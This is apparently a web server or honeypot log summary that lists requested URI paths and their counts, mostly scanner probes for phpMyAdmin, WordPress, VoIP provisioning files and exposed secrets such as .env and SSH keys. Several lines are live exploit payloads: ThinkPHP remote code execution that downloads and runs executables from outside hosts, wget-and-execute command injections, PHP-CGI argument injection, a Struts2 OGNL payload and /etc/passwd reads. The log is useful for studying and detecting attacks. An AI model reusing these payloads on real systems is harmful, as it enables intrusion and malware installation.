uri	uri_count
/phpMyAdmin-2.6.3/import.php	3
/phpMyAdmin-2.6.4-pl1/import.php	3
/phpMyAdmin-2.6.4-pl2/import.php	3
/phpMyAdmin-2.6.4-pl3/import.php	3
/phpMyAdmin-2.6.4-pl4/import.php	3
/phpMyAdmin-2.6.4-rc1/import.php	3
/phpMyAdmin-2.6.4-rc1/scripts/setup.php	3
/phpMyAdmin-2.6.4/import.php	3
/phpMyAdmin-2.7.0-beta1/import.php	3
/phpMyAdmin-2.7.0-pl1/import.php	3
/phpMyAdmin-2.7.0-pl2/import.php	3
/phpMyAdmin-2.7.0-rc1/import.php	3
/phpMyAdmin-2.7.0/import.php	3
/phpMyAdmin-2.8.0-beta1/import.php	3
/phpMyAdmin-2.8.0-rc1/import.php	3
/phpMyAdmin-2.8.0-rc2/import.php	3
/phpMyAdmin-2.8.0.1/import.php	3
/phpMyAdmin-2.8.0.2/import.php	3
/phpMyAdmin-2.8.0.3/import.php	3
/phpMyAdmin-2.8.0.4/import.php	3
/phpMyAdmin-2.8.0/import.php	3
/phpMyAdmin-2.8.1-rc1/import.php	3
/phpMyAdmin-2.8.1/import.php	3
/phpMyAdmin-2.8.2.1/import.php	3
/phpMyAdmin-2.8.2.2/import.php	3
/phpMyAdmin-2.8.2.3/import.php	3
/phpMyAdmin-2.8.2.4/import.php	3
/phpMyAdmin-2.8.2/import.php	3
/phpMyAdmin-2.9.0-beta1/import.php	3
/phpMyAdmin-2.9.0-rc1/import.php	3
/phpMyAdmin-2.9.0.1/import.php	3
/phpMyAdmin-2.9.0.2/import.php	3
/phpMyAdmin-2.9.0.3/import.php	3
/phpMyAdmin-2.9.0/import.php	3
/phpMyAdmin-2.9.0/scripts/setup.php	3
/phpMyAdmin-2.9.1-rc1/import.php	3
/phpMyAdmin-2.9.1-rc2/import.php	3
/phpMyAdmin-2.9.1.1/import.php	3
/phpMyAdmin-2.9.1/import.php	3
/phpMyAdmin-3.1.2.0-all-languages/scripts/setup.php	3
/phpMyAdmin-4.4.0-all-languages/	3
/phpMyAdmin-4.4.10-all-languages/	3
/phpMyAdmin-4.4.11-all-languages/	3
/phpMyAdmin-4.4.12-all-languages/	3
/phpMyAdmin-4.4.13-all-languages/	3
/phpMyAdmin-4.4.14-all-languages/	3
/phpMyAdmin-4.4.15-all-languages/	3
/phpMyAdmin-4.4.9-all-languages/	3
/phpMyAdmin-4.6.4-english	3
/phpMyAdmin/index.PhP	3
/phpMyAdmin/scripts/db_setup.init.php	3
/phpinf.php	3
/phpmyadmin/scripts/db_setup.init.php	3
/phpmyadmin4/scripts/setup.php	3
/phppath/cgi_wrapper	3
/phppath/cgi_wrapper?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	3
/phppath/php-cgi4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	3
/phppath/php-cgi5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	3
/phppath/php4-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	3
/phppath/php5-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	3
/phppath/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E	3
/polycom/000000000000.cfg	3
/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/wekedhonakjapzb21591.exe');start%20C:/Windows/temp/wekedhonakjapzb21591.exe	3
/spa/	3
/sqlweb/	3
/sqlweb/scripts/setup.php	3
/stats	3
/themes/tenant/css/custom.css	3
/tmpfs/snap.jpg	3
/verifylogin.do	3
/vsapres/web20/core/login.aspx	3
/webadmin/	3
/webdb/	3
/websql/	3
/wordpress/	3
/wp-includes/wlwmanifest.xml	3
/wp/	3
/wpress/wp-login.php	3
/ws/stats	3
/xxzy	3
/.DS_Store	2
/.dev	2
/.hg/hgrc	2
/.idea/WebServers.xml	2
/.ssh/id_rsa	2
/.svn/wc.db	2
/.vscode/sftp.json	2
/13	2
/2017/wp-login.php	2
/2018/wp-login.php	2
/2019/wp-login.php	2
/2phpmyadmin/scripts/setup.php	2
/805ec0000000.cfg	2
/CFIDE/administrator/index.cfm	2
/CFIDE/h.cfm	2
/CFIDE/sysinfo.cfm	2
/CFIDE/updates.cfm	2
/Cisco/	2
/Dumper/main.php	2
/EXCU_SHELL	2
/JZHp	2
/Lists/admin.php	2
/Main_Login.asp	2
/MySQL/main.php	2
/Nmap/folder/check1574636643	2
/NmapUpperCheck1574636643	2
/PMA2011/scripts/setup.php	2
/PMA2012/scripts/setup.php	2
/Robots.txt	2
/SiteMap.xml	2
/Start.asp	2
/Temporary_Listen_Addresses/SMSSERVICE	2
/UPnP/IGD.xml	2
/WSMAN	2
/WSMAN/	2
/WebClient.html	2
/WebItemsLevel.cfg	2
/_vti_bin/_vti_aut/author.dll	2
/a2billing/	2
/a2billing/admin/Public/	2
/a2billing/customer/index.php	2
/admin-console/	2
/admin-console/github.com/joaomatosf/jexboss	2
/admin/Start.asp	2
/admin/config.php?password%5B0%5D=bebydviyx&username=admin	2
/admin/i18n/readme.txt	2
/admin/mysql/	2
/admin/mysql/scripts/setup.php	2
/admin/newuser.php	2
/admin/pma/	2
/admincooptel/phpMyAdmin/scripts/setup.php	2
/alt/sqladmin/scripts/setup.php	2
/api	2
/api/v1/overview/default?filterBy=&itemsPerPage=10&name=&page=1&sortBy=d,creationTimestamp	2
/app/.env	2
/authorization/?/	2
/axis2/	2
/az/	2
/azor/	2
/azorult/	2
/blog/administrator/index.php	2
/blog2/wp-login.php	2
/blog3/wp-login.php	2
/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfm	2
/cf_scripts/scripts/cfformhistory.cfm	2
/cgi-bin/	2
/cgi-bin/nobody/Machine.cgi?action=get_capability	2
/cgi-bin/status	2
/cgi-bin/webcm?getpage=../html/menus/menu2.html&var:lang=%26%20allcfgconv%20-C%20voip%20-c%20-o%20-%20../../../../../var/tmp/voip.cfg%20%26	2
/clientaccesspolicy.xml	2
/cms/Drupal/	2
/cms/wp-includes/wlwmanifest.xml	2
/cms/wp-login.php	2
/components/com_sexycontactform/fileupload/	2
/configs/	2
/connectors/system/phpthumb.php	2
/core/CHANGELOG.txt	2
/corporate/webpages/login.jsp	2
/cpadmindb/scripts/setup.php	2
/cpanelmysql/scripts/setup.php	2
/database/scripts/setup.php	2
/db	2
/default.jsp	2
/devicecfg/	2
/devicecfg/polycom/000000000000.cfg	2
/dms/000000000000.cfg	2
/dns-query	2
/domain/wp-login.php	2
/drupal8/	2
/drupal8/sites/	2
/dump/main.php	2
/etc/lib/pChart2/examples/index.php?Action=View&Script=../../../../cnf/db.php	2
/farm/libs/modules/tween/tween.min.js	2
/forum/	2
/forums/	2
/forums/wp-login.php	2
/ftpsync.settings	2
/get_webdavInfo.asp	2
/grandstream/	2
/gs/	2
/header.php?tab=status	2
/html/.env	2
/images/	2
/images/logo.gif	2
/images/stories/def.gif	2
/images/stories/up.php	2
/include/taglib/shell.lib.php	2
/index.asp	2
/index.php?option=com_adsmanager&task=upload&tmpl=component	2
/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form	2
/index.php?option=com_jdownloads&Itemid=0&view=upload	2
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2046.30.43.159:81/zz	2
/index/index.php?h=KAvZPRgeOo1%3d&d=KgvxxT30EY0oBNAMIC4PvBo%2b7wU4HjqNKAvZPRgeOo0ZM%2bkIKSwPuxA67QgvKwO9EDroE3JuXa0IK%2fkdOD4arQgr%2bR04PhqtCCv5HTg%2bGq0IK6%3d%3d	2
/indexAction.action	2
/install.php?finish=1	2
/install/include/sanity.php	2
/jbossass/jbossass.jsp	2
/jbossmq-httpil/HTTPServerILServlet	2
/jira/secure/ContactAdministrators%21default.jspa	2
/joomla/robots.txt	2
/js/slinkroot.js	2
/ldskflks	2
/linksys/	2
/login.cgi	2
/login.do	2
/login.jsp	2
/login.php	2
/login/	2
/login/indexAction.action	2
/login/login.jsp	2
/login/submit/only	2
/mail/admin/index.php	2
/members.php	2
/mitel/	2
/msd1.21/main.php	2
/msddump/main.php	2
/msddumper/main.php	2
/msdump/main.php	2
/myAdmin/scripts/setup.php	2
/myadm/scripts/setup.php	2
/myblog/wp-login.php	2
/myforum/wp-login.php	2
/mysql/print.css	2
/mysqldump/main.php	2
/nmaplowercheck1573703668	2
/nmaplowercheck1574636643	2
/openserver/phpmyadmin/	2
/pMA/	2
/phmyadm/scripts/setup.php	2
/phone/	2
/phones/	2
/php/phpMyAdmin/scripts/setup.php	2
/phpLDAPadmin/scripts/setup.php	2
/phpMyA/	2
/phpMyAdmi/	2
/phpMyAdmin-2.10.0.1/scripts/setup.php	2
/phpMyAdmin-2.10.0.2/scripts/setup.php	2
/phpMyAdmin-2.10.0/	2
/phpMyAdmin-2.10.1.0/scripts/setup.php	2
/phpMyAdmin-2.10.2.0/scripts/setup.php	2
/phpMyAdmin-2.11.0.0/scripts/setup.php	2
/phpMyAdmin-2.11.1.1/scripts/setup.php	2
/phpMyAdmin-2.11.11	2
/phpMyAdmin-2.11.11.3	2
/phpMyAdmin-2.11.2	2
/phpMyAdmin-2.11.2-rc1	2
/phpMyAdmin-2.11.2.1	2
/phpMyAdmin-2.11.2.2	2
/phpMyAdmin-2.11.3	2
/phpMyAdmin-2.11.3-rc1	2
/phpMyAdmin-2.11.4	2
/phpMyAdmin-2.11.4-rc1	2
/phpMyAdmin-2.11.5	2
/phpMyAdmin-2.11.5-all-languages	2
/phpMyAdmin-2.11.5-rc1	2
/phpMyAdmin-2.11.5.1	2
/phpMyAdmin-2.11.5.2	2
/phpMyAdmin-2.11.6	2
/phpMyAdmin-2.11.6-rc1	2
/phpMyAdmin-2.11.7	2
/phpMyAdmin-2.11.7-rc1	2
/phpMyAdmin-2.11.7-rc2	2
/phpMyAdmin-2.11.7.1	2
/phpMyAdmin-2.11.8	2
/phpMyAdmin-2.11.8-rc1	2
/phpMyAdmin-2.11.8.1	2
/phpMyAdmin-2.11.9	2
/phpMyAdmin-2.11.9.1	2
/phpMyAdmin-2.11.9.2	2
/phpMyAdmin-2.11.9.4	2
/phpMyAdmin-2.11.9.5	2
/phpMyAdmin-2.11.9.6	2
/phpMyAdmin-2.2.3	2
/phpMyAdmin-2.2.6	2
/phpMyAdmin-2.3.0/	2
/phpMyAdmin-2.3.1/	2
/phpMyAdmin-2.3.2/	2
/phpMyAdmin-2.3.3/	2
/phpMyAdmin-2.3.4/	2
/phpMyAdmin-2.3.5/	2
/phpMyAdmin-2.3.6/	2
/phpMyAdmin-2.3.7/	2
/phpMyAdmin-2.3.8/	2
/phpMyAdmin-2.3.9/	2
/phpMyAdmin-2.4.0/	2
/phpMyAdmin-2.4.1/	2
/phpMyAdmin-2.4.2/	2
/phpMyAdmin-2.4.3/	2
/phpMyAdmin-2.4.4/	2
/phpMyAdmin-2.4.5/	2
/phpMyAdmin-2.4.6/	2
/phpMyAdmin-2.4.7/	2
/phpMyAdmin-2.4.8/	2
/phpMyAdmin-2.4.9/	2
/phpMyAdmin-2.5.0/	2
/phpMyAdmin-2.5.1	2
/phpMyAdmin-2.5.2/	2
/phpMyAdmin-2.5.3/	2
/phpMyAdmin-2.5.4	2
/phpMyAdmin-2.5.5	2
/phpMyAdmin-2.5.5-pl1	2
/phpMyAdmin-2.5.5-rc1	2
/phpMyAdmin-2.5.5-rc2	2
/phpMyAdmin-2.5.5/scripts/setup.php	2
/phpMyAdmin-2.5.6	2
/phpMyAdmin-2.5.6-rc1	2
/phpMyAdmin-2.5.6-rc2	2
/phpMyAdmin-2.5.7	2
/phpMyAdmin-2.5.7-pl1	2
/phpMyAdmin-2.5.8/	2
/phpMyAdmin-2.5.9/	2
/phpMyAdmin-2.6.0	2
/phpMyAdmin-2.6.0-alpha	2
/phpMyAdmin-2.6.0-alpha2	2
/phpMyAdmin-2.6.0-beta1	2
/phpMyAdmin-2.6.0-beta2	2
/phpMyAdmin-2.6.0-pl1	2
/phpMyAdmin-2.6.0-pl2	2
/phpMyAdmin-2.6.0-pl3	2
/phpMyAdmin-2.6.0-rc1	2
/phpMyAdmin-2.6.0-rc2	2
/phpMyAdmin-2.6.0-rc3	2
/phpMyAdmin-2.6.1	2
/phpMyAdmin-2.6.1-pl1	2
/phpMyAdmin-2.6.1-pl2	2
/phpMyAdmin-2.6.1-pl2/scripts/setup.php	2
/phpMyAdmin-2.6.1-pl3	2
/phpMyAdmin-2.6.1-pl3/scripts/setup.php	2
/phpMyAdmin-2.6.1-rc1	2
/phpMyAdmin-2.6.1-rc2	2
/phpMyAdmin-2.6.2	2
/phpMyAdmin-2.6.2-beta1	2
/phpMyAdmin-2.6.2-pl1	2
/phpMyAdmin-2.6.2-rc1	2
/phpMyAdmin-2.6.3	2
/phpMyAdmin-2.6.3-pl1	2
/phpMyAdmin-2.6.3-rc1	2
/phpMyAdmin-2.6.4	2
/phpMyAdmin-2.6.4-pl1	2
/phpMyAdmin-2.6.4-pl2	2
/phpMyAdmin-2.6.4-pl3	2
/phpMyAdmin-2.6.4-pl4	2
/phpMyAdmin-2.6.4-pl4/scripts/setup.php	2
/phpMyAdmin-2.6.4-rc1	2
/phpMyAdmin-2.6.5/	2
/phpMyAdmin-2.6.6/	2
/phpMyAdmin-2.6.6/scripts/setup.php	2
/phpMyAdmin-2.6.7/	2
/phpMyAdmin-2.6.8/	2
/phpMyAdmin-2.6.9/	2
/phpMyAdmin-2.6.9/scripts/setup.php	2
/phpMyAdmin-2.7.0	2
/phpMyAdmin-2.7.0-beta1	2
/phpMyAdmin-2.7.0-pl1	2
/phpMyAdmin-2.7.0-pl2	2
/phpMyAdmin-2.7.0-rc1	2
/phpMyAdmin-2.7.0-rc1/scripts/setup.php	2
/phpMyAdmin-2.7.1/	2
/phpMyAdmin-2.7.2/	2
/phpMyAdmin-2.7.3/	2
/phpMyAdmin-2.7.4/	2
/phpMyAdmin-2.7.5/	2
/phpMyAdmin-2.7.5/scripts/setup.php	2
/phpMyAdmin-2.7.6/	2
/phpMyAdmin-2.7.6/scripts/setup.php	2
/phpMyAdmin-2.7.7/	2
/phpMyAdmin-2.7.8/	2
/phpMyAdmin-2.7.9/	2
/phpMyAdmin-2.8.0-beta1	2
/phpMyAdmin-2.8.0.4/scripts/setup.php	2
/phpMyAdmin-2.8.2/scripts/setup.php	2
/phpMyAdmin-2.8.3/	2
/phpMyAdmin-2.8.3/scripts/setup.php	2
/phpMyAdmin-2.8.4/	2
/phpMyAdmin-2.8.4/scripts/setup.php	2
/phpMyAdmin-2.8.5/	2
/phpMyAdmin-2.8.5/scripts/setup.php	2
/phpMyAdmin-2.8.6/	2
/phpMyAdmin-2.8.6/scripts/setup.php	2
/phpMyAdmin-2.8.7/	2
/phpMyAdmin-2.8.7/scripts/setup.php	2
/phpMyAdmin-2.8.8/	2
/phpMyAdmin-2.8.9/	2
/phpMyAdmin-2.8.9/scripts/setup.php	2
/phpMyAdmin-2.9.0.1/scripts/setup.php	2
/phpMyAdmin-2.9.1/	2
/phpMyAdmin-2.9.1/scripts/setup.php	2
/phpMyAdmin-2.9.2-rc1/import.php	2
/phpMyAdmin-2.9.2/	2
/phpMyAdmin-2.9.2/import.php	2
/phpMyAdmin-2.9.2/scripts/setup.php	2
/phpMyAdmin-2/import.php	2
/phpMyAdmin-3.0.0-alpha/import.php	2
/phpMyAdmin-3.0.0-beta/import.php	2
/phpMyAdmin-3.0.0-rc1-english/scripts/setup.php	2
/phpMyAdmin-3.0.0-rc1/import.php	2
/phpMyAdmin-3.0.0-rc2/import.php	2
/phpMyAdmin-3.0.0/import.php	2
/phpMyAdmin-3.0.1-rc1/import.php	2
/phpMyAdmin-3.0.1.0-english/scripts/setup.php	2
/phpMyAdmin-3.0.1.0/scripts/setup.php	2
/phpMyAdmin-3.0.1/import.php	2
/phpMyAdmin-3.1.0-beta1/import.php	2
/phpMyAdmin-3.1.0-rc1/import.php	2
/phpMyAdmin-3.1.0/import.php	2
/phpMyAdmin-3.1.1-rc1/import.php	2
/phpMyAdmin-3.1.1.0-all-languages/scripts/setup.php	2
/phpMyAdmin-3.1.1/import.php	2
/phpMyAdmin-3.1.2-rc1/import.php	2
/phpMyAdmin-3.1.2.0-english/scripts/setup.php	2
/phpMyAdmin-3.1.2/import.php	2
/phpMyAdmin-3.1.3-rc1/import.php	2
/phpMyAdmin-3.1.3.1/import.php	2
/phpMyAdmin-3.1.3.2/import.php	2
/phpMyAdmin-3.1.3/import.php	2
/phpMyAdmin-3.1.4-rc1/import.php	2
/phpMyAdmin-3.1.4-rc2/import.php	2
/phpMyAdmin-3.1.4/import.php	2
/phpMyAdmin-3.1.5-rc1/import.php	2
/phpMyAdmin-3.1.5/import.php	2
/phpMyAdmin-3.2.0-beta1/import.php	2
/phpMyAdmin-3.2.0-rc1/import.php	2
/phpMyAdmin-3.2.0.1/import.php	2
/phpMyAdmin-3.2.0/import.php	2
/phpMyAdmin-3.2.1-rc1/import.php	2
/phpMyAdmin-3.2.1/import.php	2
/phpMyAdmin-3.2.2-rc1/import.php	2
/phpMyAdmin-3.2.2.1/import.php	2
/phpMyAdmin-3.2.2/import.php	2
/phpMyAdmin-3.2.3-rc1/import.php	2
/phpMyAdmin-3.2.3/import.php	2
/phpMyAdmin-3.2.4-rc1/import.php	2
/phpMyAdmin-3.2.5-rc1/import.php	2
/phpMyAdmin-3.2.5-rc2/import.php	2
/phpMyAdmin-3.2.5/import.php	2
/phpMyAdmin-3.3.0-alpha1/import.php	2
/phpMyAdmin-3.3.0-beta1/import.php	2
/phpMyAdmin-3.3.0-rc1/import.php	2
/phpMyAdmin-3.3.0-rc2/import.php	2
/phpMyAdmin-3.3.0-rc3/import.php	2
/phpMyAdmin-3.3.0/import.php	2
/phpMyAdmin-3.3.1-rc1/import.php	2
/phpMyAdmin-3.3.1/import.php	2
/phpMyAdmin-3.3.10-rc1/import.php	2
/phpMyAdmin-3.3.10.1/import.php	2
/phpMyAdmin-3.3.10.2/import.php	2
/phpMyAdmin-3.3.10.3/import.php	2
/phpMyAdmin-3.3.10.4/import.php	2
/phpMyAdmin-3.4.3.1/scripts/setup.php	2
/phpMyAdmin-www072510/scripts/setup.php	2
/phpMyAdmin/%2520index.PhP	2
/phpMyAdmin1/	2
/phpMyAdmin2017/	2
/phpMyAdmin2018/	2
/phpMyAdminold/scripts/setup.php	2
/phpMyAds/	2
/phpm/	2
/phpmanager	2
/phpmanager/scripts/setup.php	2
/phpmy-admin	2
/phpmyad-sys/	2
/phpmyad/	2
/phpmyadmin%2520	2
/phpmyadmin.box25/scripts/setup.php	2
/phpmyadmin/%2520index.php	2
/phpmyadmin/print.css	2
/phpmyadmin/scripts/setup.php/index.php	2
/phpmyadmin/setup.php/index.php	2
/phpmyadmin2	2
/pic.ico	2
/plugins/weathermap/configs/conn.php?id=wget%20-O%20apche2017.sh%20http://222.184.79.11:5317/apche2017.sh;chmod%20777%20apche2017.sh;./apche2017.sh	2
/pma	2
/pma2005/scripts/setup.php	2
/portal/wp-login.php	2
/portal2/wp-login.php	2
/prov/000000000000.cfg	2
/prov/polycom/	2
/prov/yealink/	2
/provision/polycom/	2
/provision/yealink/	2
/provisioning/	2
/provisioning/y000000000000.cfg	2
/public/index.php/?s=captcha	2
/public/shell.php	2
/pv/y000000000000.cfg	2
/pyaniste/mysqladmin/scripts/setup.php	2
/recordings/Do.php	2
/register.php	2
/requested.html	2
/rhm	2
/security.txt	2
/sftp_config.json	2
/shell	2
/shell?cat%20/etc/passwd	2
/shorewaredirector/login.asp	2
/sip/	2
/site/wp-includes/wlwmanifest.xml	2
/snom/	2
/sql/	2
/ss/index.php?l=page_view&p=advanced_search	2
/stalker_portal/server/adm/users/users-list-json	2
/stat/welcome.php?tab=status	2
/stationpwd.htm	2
/test/wp-login.php	2
/testblog/wp-login.php	2
/teststite/wp-login.php	2
/tftpboot/	2
/themes/elastixneo/login_styles.css	2
/ui/cbpc/login?lang=IT/ui/cbpc/login?lang=IT	2
/unauthenticated/provisioning/	2
/upgrade.aspx?a1=a51599c6	2
/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;cd%20/tmp;wget%20http://178.128.11.199/qtx.arm%20-O%20z;chmod%20777%20z;./z%20upgrade;%27	2
/vb/	2
/vb5/	2
/vbulletin/	2
/vbulletin5/	2
/vlog/wp-login.php	2
/voip/	2
/web.config	2
/web/cgi-bin/hi3510/param.cgi?cmd=getp2pattr&cmd=getuserattr	2
/web/phpMyAdmin/	2
/web/phpmyadmin/scripts/setup.php	2
/webapp/gwt/clean/clean.css	2
/webcapture.jpg?command=snap&channel=1	2
/wordpress/wp-includes/wlwmanifest.xml	2
/wordpress5/wp-login.php	2
/wordpress6/wp-login.php	2
/wp-content/plugins/woocommerce/vendor/phpunit/phpunit/src/Util/Filter.php	2
/wp/wp-includes/wlwmanifest.xml	2
/wp4/wp-login.php	2
/wp5/wp-login.php	2
/wp6/wp-login.php	2
/wp7/wp-login.php	2
/wp8/wp-login.php	2
/wwwroot.zip	2
/y000000000000.cfg	2
/y000000000028.cfg	2
/y000000000029.cfg	2
/~riba/pma/scripts/setup.php	2
/%23wp-config.php%23	1
/%2525%257b%28%2523dm%253d%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%29.%28%2523_memberAccess%253f%28%2523_memberAccess%253d%2523dm%29%253a%28%28%2523container%253d%2523context%255b%2527com.opensymphony.xwork2.ActionContext.container%2527%255d%29.%28%2523ognlUtil%253d%2523container.getInstance%28%2540com.opensymphony.xwork2.ognl.OgnlUtil%2540class%29%29.%28%2523ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%2523ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%2523context.setMemberAccess%28%2523dm%29%29%29%29.%28%2523res%253d%2540org.apache.struts2.ServletActionContext%2540getResponse%28%29%29.%28%2523res.addHeader%28%2527eresult%2527%252c%2527struts2_security_check%2527%29%29%257d/index.action	1
/%253Cinvalid%253Ehello.html	1
/%253Cscript%253Ealert%25281%2529%253C/script%253E.html	1
/%2575%2573%2565%2572/%2572%2565%2567%2569%2573%2574%2565%2572	1
/%2BCSCOE%2B/logon.html	1
/%3Cinvalid%3Ehello.html	1
/%3Cscript%3Ealert%281%29%3C/script%3E.html	1
/.env.example	1
/.ssh/id_dsa	1
/.ssh/id_ecdsa	1
/.ssh/id_ed25519	1
/.well-known/acme-challenge/RbXFEv6dzypVLdi-xMv1Z_PHQueGxCJ-dFNXgypOz8g	1
/.wp-config.php.swp	1
/0/wp-login.php	1
